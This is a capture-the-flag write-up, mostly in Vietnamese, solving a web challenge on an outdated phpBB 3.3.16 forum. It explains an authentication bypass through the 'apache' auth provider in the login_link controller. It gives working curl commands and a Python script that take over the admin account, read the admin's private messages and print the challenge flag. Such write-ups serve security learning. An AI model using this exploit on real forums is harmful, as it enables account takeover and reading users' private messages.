---
title: PHP is my passion
date: 2026-09-27
ctf: NNS CTF
category: web
difficulty: easy
tags:
  - phpBB
---

## Đề bài
I run a phpBB forum, but it's a bit outdated. Maybe there's a well-known vulnerability that can be exploited?

File: [web_php-is-my-passion.tar.gz](https://github.com/Drakie14/Challenges/blob/NNS-CTF/web_php-is-my-passion.tar.gz)
## Solution
phpBB **3.3.16**. `seed.php` nhét flag vào một **private message gửi cho `user_id=2` (admin)**; mật khẩu admin ngẫu nhiên 24 ký tự đặt lúc build nên không đăng nhập trực tiếp được.

Bản này dính **[CVE-2026-48611](https://pentest-tools.com/research/phpbb-authentication-bypass)** (auth bypass, vá ở 3.3.17): controller liên kết tài khoản OAuth `ucp.php?mode=login_link` cho phép **chọn auth provider tuỳ ý** qua tham số `auth_provider`, bỏ qua `auth_method=db` của board. Provider **`apache`** uỷ quyền xác thực cho web server — chỉ kiểm tra `PHP_AUTH_USER == username` và `PHP_AUTH_PW != ''`, **không** so mật khẩu với hash.

Ảnh `php:8.2-apache` (mod_php) tự map header `Authorization: Basic` → `PHP_AUTH_*`, còn `login_link_x=1` (nút submit kiểu image) làm dữ liệu login_link khác rỗng để qua cửa. Một request là có session admin:

```bash!
# 1) Auth bypass -> session admin (Set-Cookie: ..._u=2)
curl -i -u admin:x -c cookies.txt \
  -d 'login_username=admin&login_password=x&login=Login' \
  'http://HOST:PORT/ucp.php?mode=login_link&auth_provider=apache&login_link_x=1'

# 2) Đọc PM inbox lấy flag
curl -s -b cookies.txt 'http://HOST:PORT/ucp.php?i=pm&folder=inbox'
curl -s -b cookies.txt 'http://HOST:PORT/ucp.php?i=pm&mode=view&p=1'
```

->Flag: `NNS{PHP_1s_mY_P455ion_4ND_s0_aRe_4PacHe_4u7h_pRoviD3r5}`

Full solve:

```python!
import base64, re, sys, requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8080"
s = requests.Session()
s.get(f"{BASE}/index.php")

basic = base64.b64encode(b"admin:x").decode()
s.post(f"{BASE}/ucp.php",
       params={"mode": "login_link", "auth_provider": "apache", "login_link_x": "1"},
       headers={"Authorization": f"Basic {basic}"},
       data={"login_username": "admin", "login_password": "x", "login": "Login"})

for pid in (1, 2, 3):
    html = s.get(f"{BASE}/ucp.php", params={"i": "pm", "mode": "view", "p": pid}).text
    m = re.search(r"NNS\{[^}]*\}", html)
    if m:
        print(m.group()); break
```
